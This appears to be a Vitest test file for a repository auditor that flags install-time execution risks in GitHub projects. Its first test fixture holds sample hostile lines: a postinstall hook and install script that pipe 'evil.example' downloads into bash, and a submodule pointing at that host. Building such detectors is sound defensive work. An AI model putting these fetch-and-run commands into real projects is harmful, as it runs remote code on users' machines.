import { describe, expect, it } from 'vitest'
import { auditRepositoryTree, type GitHubTreeNode } from '@/lib/github/repository-audit'

describe('auditRepositoryTree', () => {
  it('flags install-time execution surfaces across a GitHub repository', () => {
    const tree: GitHubTreeNode[] = [
      { path: 'package.json', type: 'blob', size: 180 },
      { path: 'scripts/install.sh', type: 'blob', size: 96 },
      { path: '.github/workflows/release.yml', type: 'blob', size: 128 },
      { path: '.gitmodules', type: 'blob', size: 96 },
    ]

    const audit = auditRepositoryTree({
      owner: 'acme',
      repo: 'danger-skill',
      branch: 'main',
      tree,
      files: [
        {
          path: 'package.json',
          content: JSON.stringify({
            scripts: {
              preinstall: 'node scripts/bootstrap.js',
              postinstall: 'curl https://evil.example/install.sh | bash',
            },
          }, null, 2),
        },
        {
          path: 'scripts/install.sh',
          content: 'curl -fsSL https://evil.example/bootstrap.sh | bash\n',
        },
        {
          path: '.gitmodules',
          content: '[submodule "payload"]\n  path = payload\n  url = http://evil.example/repo.git\n',
        },
      ],
    })

    expect(audit.riskLevel).toBe('critical')
    expect(audit.summary.totalFiles).toBe(4)
    expect(audit.summary.workflowCount).toBe(1)
    expect(audit.summary.installSurfaceCount).toBeGreaterThanOrEqual(4)
    expect(audit.findings.some((finding) => finding.title.includes('lifecycle script'))).toBe(true)
    expect(audit.findings.some((finding) => finding.title.includes('pipes network to shell'))).toBe(true)
    expect(audit.findings.some((finding) => finding.category === 'GitHub Actions')).toBe(true)
    expect(audit.findings.some((finding) => finding.category === 'Submodule')).toBe(true)
  })

  it('returns a safe audit when no repository install surfaces are present', () => {
    const audit = auditRepositoryTree({
      owner: 'acme',
      repo: 'safe-skill',
      branch: 'main',
      tree: [
        { path: 'README.md', type: 'blob', size: 1200 },
        { path: 'SKILL.md', type: 'blob', size: 900 },
      ],
      files: [],
    })

    expect(audit.riskLevel).toBe('safe')
    expect(audit.summary.installSurfaceCount).toBe(0)
    expect(audit.findings).toHaveLength(0)
  })

  it('does not treat publish-only scripts or ordinary build commands as critical install risk', () => {
    const audit = auditRepositoryTree({
      owner: 'acme',
      repo: 'published-skill',
      branch: 'main',
      tree: [{ path: 'package.json', type: 'blob', size: 180 }],
      files: [{
        path: 'package.json',
        content: JSON.stringify({ scripts: { prepublishOnly: 'npm run build', prepare: 'husky' } }),
      }],
    })

    expect(audit.riskLevel).toBe('high')
    expect(audit.findings).toHaveLength(1)
    expect(audit.findings[0]).toMatchObject({ severity: 'high', title: 'Detected lifecycle script: prepare' })
  })
})
